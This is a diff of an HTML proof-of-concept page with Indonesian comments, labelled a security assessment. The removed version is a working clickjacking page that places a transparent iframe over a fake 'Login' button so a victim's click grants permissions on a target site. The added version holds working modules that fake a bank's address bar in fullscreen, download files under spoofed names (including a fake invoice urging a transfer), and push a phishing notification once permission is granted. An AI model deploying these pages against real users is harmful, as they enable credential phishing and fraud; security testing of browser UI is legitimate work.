@@ -2,70 +2,140 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Halaman Login — Pusat Layanan</title>
+<title>Landing Page — Security Assessment PoC</title>
 <style>
-  body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; }
-  .wrap { max-width: 360px; margin: 60px auto; background: #fff; padding: 24px;
-          border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.15); }
-  h1 { font-size: 18px; text-align: center; }
-  input[type=text], input[type=password] {
-    width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc;
-    border-radius: 4px; box-sizing: border-box;
-  }
-  .btn {
-    width: 100%; padding: 10px; margin-top: 8px; background: #1a73e8;
-    color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;
-  }
-  /* ===== Teknik spoofing CWE-1021 =====
-     1) Layer iframe transparan diposisikan di atas tombol.
-     2) Konten iframe digeser (negative offset) agar tombol "Ya, beri izin"
-        pada halaman target persis menutupi tombol "Login" yang terlihat.
-     3) opacity 0 → aksi korban diarahkan ke aksi tersembunyi. */
-  .overlay {
-    position: absolute; opacity: 0.0;   /* ubah ke 0.1 untuk debug visual */
-    width: 300px; height: 220px; border: none; z-index: 10;
-  }
-  #hiddenFrame { top: 158px; left: calc(50% - 150px); }
+  body { font-family: Arial, sans-serif; background:#f4f4f4; padding:20px; }
+  .card { background:#fff; border-radius:8px; padding:16px; margin:16px auto;
+          max-width:600px; box-shadow:0 2px 8px rgba(0,0,0,.12); }
+  button { padding:8px 14px; margin:4px; cursor:pointer; }
+  pre { background:#eee; padding:8px; font-size:12px; overflow:auto; }
+  /* ===== Modul 1: Address bar spoofing ===== */
+  /* fullscreen menyembunyikan address bar; elemen palsu menampilkan
+     "address bar" overlay yang dipalsukan penyerang */
+  .fakebar { display:none; position:fixed; top:0; left:0; right:0; height:56px;
+             background:#f1f3f4; border-bottom:1px solid #ccc; z-index:9999;
+             padding:8px 12px; box-sizing:border-box; }
+  .fakebar .omnibox { background:#fff; border-radius:20px; padding:10px 16px;
+             border:1px solid #ddd; font-size:14px; color:#333; }
+  .fakebar .padlock { color:#0b8043; margin-right:8px; font-size:13px; }
+  .fakebar .closebar { position:absolute; right:10px; top:10px; cursor:pointer;
+             color:#555; font-weight:bold; }
 </style>
 </head>
 <body>
-<div class="wrap" style="position: relative;">
-  <h1>🔐 Masuk ke Akun Anda</h1>
-  <input type="text" placeholder="Email" autocomplete="off">
-  <input type="password" placeholder="Kata sandi" autocomplete="off">
 
-  <!-- Tombol yang TERLIHAT oleh korban -->
-  <button class="btn" tabindex="-1">Login</button>
+<!-- ================= MODUL 1: ADDRESS BAR SPOOFING ================= -->
+<div class="fakebar" id="fakebar">
+  <span class="padlock">&#128274;</span>
+  <span class="omnibox">https://www.bank-terpercaya.co.id/dashboard</span>
+  <span class="closebar" onclick="exitSpoof()">[X]</span>
+</div>
+<div class="card">
+  <h3>1. Address Bar Spoofing</h3>
+  <p>Teknik: fullscreen API menyembunyikan address bar asli (H5FS — HTML5
+     fullscreen spoofing), lalu fake address bar dirender di atasnya.</p>
+  <button onclick="startAddrSpoof()">Mulai Spoof Address Bar</button>
+  <button onclick="exitSpoof()">Keluar</button>
+  <pre id="log1">Status: idle</pre>
+</div>
 
-  <!-- Layer tersembunyi: halaman target berisi aksi berbahaya.
-       Ganti TARGET_URL dengan halaman konfirmasi pada aset yang diuji,
-       mis. https://target-anda.test/settings/oauth-grant.html
-       Sesuaikan offset top/left agar tombol konfirmasi target
-       sejajar persis di atas tombol "Login". -->
-  <iframe id="hiddenFrame" class="overlay"
-          src="TARGET_URL"
-          sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+<!-- ================= MODUL 2: DOWNLOAD ORIGIN SPOOFING ================= -->
+<div class="card">
+  <h3>2. Download Origin Spoofing</h3>
+  <p>Teknik: file dibuat via Blob + anchor download attribute sehingga
+     dialog unduhan menampilkan nama & asal file yang dipalsukan, meski
+     konten dibuat lokal oleh skrip halaman ini.</p>
+  <button onclick="spoofDownload()">Unduh "laporan-resmi-bank.pdf"</button>
+  <button onclick="spoofHTML()">Unduh "invoice-secured.html"</button>
+  <pre id="log2">Status: idle</pre>
+</div>
+
+<!-- ================= MODUL 3: AUDIO AUTOPLAY → PERMISSION PROMPT SPOOFING ================= -->
+<div class="card">
+  <h3>3. Audio Autoplay Permission Prompt Spoofing</h3>
+  <p>Teknik: elemen audio mikro (1 frame senyap) dipasang di bawah cursor /
+     area klik. Ketika korban melakukan interaksi (klik play), permintaan
+     Notification Permission browser terpicu pada asal domain penyerang,
+     tampak seperti dialog dari situs yang dipalsukan &rarr; korban menerima
+     notifikasi spam/phishing dari asal yang sebenarnya.</p>
+  <button id="playBtn">Play (uji prompt notifikasi)</button>
+  <button onclick="askNotif()">Minta Notification Permission</button>
+  <pre id="log3">Status: idle</pre>
+  <!-- audio senyap 1 detik, perlu di-host file .mp3/.ogg di aset uji -->
+  <audio id="silent" src="silent-1s.mp3" preload="auto"></audio>
 </div>
 
 <script>
-  // Dinamis: pasang offset klik terhadap tombol terlihat (scroll-safe)
-  const btn   = document.querySelector('.btn');
-  const frame = document.getElementById('hiddenFrame');
-  function align() {
-    const r = btn.getBoundingClientRect();
-    frame.style.top    = (r.top + window.scrollY + r.height/2 - 110) + 'px';
-    frame.style.left   = (r.left + r.width/2  - 150) + 'px';
-  }
-  align();
-  window.addEventListener('resize', align);
-  window.addEventListener('scroll', align);
+/* ---------- Modul 1: Address bar spoofing ---------- */
+function startAddrSpoof() {
+  const log = document.getElementById('log1');
+  const el = document.documentElement;
+  const req = el.requestFullscreen || el.webkitRequestFullscreen;
+  if (!req) { log.textContent = 'Status: Fullscreen API tidak tersedia'; return; }
+  req.call(el).then(() => {
+    document.getElementById('fakebar').style.display = 'block';
+    log.textContent = 'Status: address bar asli tersembunyi (fullscreen), '
+      + 'fake bar dirender. Periksa apakah pengguna dapat membedakan.';
+  }).catch(e => { log.textContent = 'Status: gagal fullscreen — ' + e.message; });
+}
+function exitSpoof() {
+  document.getElementById('fakebar').style.display = 'none';
+  if (document.fullscreenElement) document.exitFullscreen();
+}
 
-  // Tandai saat aksi korban tertangkap layer (untuk log pengujian)
-  frame.addEventListener('load', () => {
-    try { frame.contentWindow.addEventListener('click',
-      e => console.log('[POC] Klik korban diarahkan ke target:', e.clientX, e.clientY));
-    } catch (err) { /* cross-origin: cek log di sisi target */ }
+/* ---------- Modul 2: Download origin spoofing ---------- */
+function spoofDownload() {
+  // Payload arbitrer disamarkan sebagai PDF — validasi apakah browser
+  // menampilkan asal (URL halaman) vs nama file yang dipalsukan.
+  const bytes = new Uint8Array([0x25,0x50,0x44,0x46,0x2D,0x31,0x2E,0x34,
+    0x0A,0x25,0xE2,0xE3,0xCF,0xD3,0x0A]); // header PDF minimal
+  const blob = new Blob([bytes], {type:'application/pdf'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'laporan-resmi-bank.pdf';
+  a.click();
+  URL.revokeObjectURL(a.href);
+  document.getElementById('log2').textContent =
+    'Status: unduhan dipicu dengan nama dipalsukan. Catat tampilan dialog '
+    + 'dan origin yang dilaporkan browser.';
+}
+function spoofHTML() {
+  const content = '<html><body><h1>Invoice #2026-0931</h1>' +
+    '<p>Total: Rp 12.500.000 — <b>Segera transfer ke rekening berikut...</b></p>' +
+    '<script>alert("Dibuka dari file lokal — skrip berjalan di origin file://")<\/script>' +
+    '</body></html>';
+  const blob = new Blob([content], {type:'text/html'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'invoice-secured.html';
+  a.click();
+  URL.revokeObjectURL(a.href);
+  document.getElementById('log2').textContent =
+    'Status: file HTML diunduh; saat dibuka dari disk, skrip berjalan tanpa '
+    + 'sandbox — uji apakah ini mengeksekusi JS tanpa peringatan.';
+}
+
+/* ---------- Modul 3: Audio autoplay → Notification prompt ---------- */
+const log3 = document.getElementById('log3');
+document.getElementById('playBtn').addEventListener('click', () => {
+  const au = document.getElementById('silent');
+  au.play().then(() => {
+    log3.textContent = 'Status: audio senyap diputar (autoplay/diinteraksi). '
+      + 'Notification permission sekarang dapat diminta oleh halaman.';
+  }).catch(e => { log3.textContent = 'Status: autoplay ditolak — ' + e.message; });
+});
+function askNotif() {
+  Notification.requestPermission().then(p => {
+    log3.textContent = 'Status: permission = ' + p + (p === 'granted'
+      ? ' — uji spam notification dari origin halaman ini.'
+      : ' — prompt ditolak pengguna.');
+    if (p === 'granted') {
+      new Notification('Keamanan Akun Anda Terkompromasi',
+        { body: 'Klik untuk verifikasi identitas Anda sekarang.',
+          icon: 'https://via.placeholder.com/64' });
+    }
   });
+}
 </script>
 </body>
 </html>
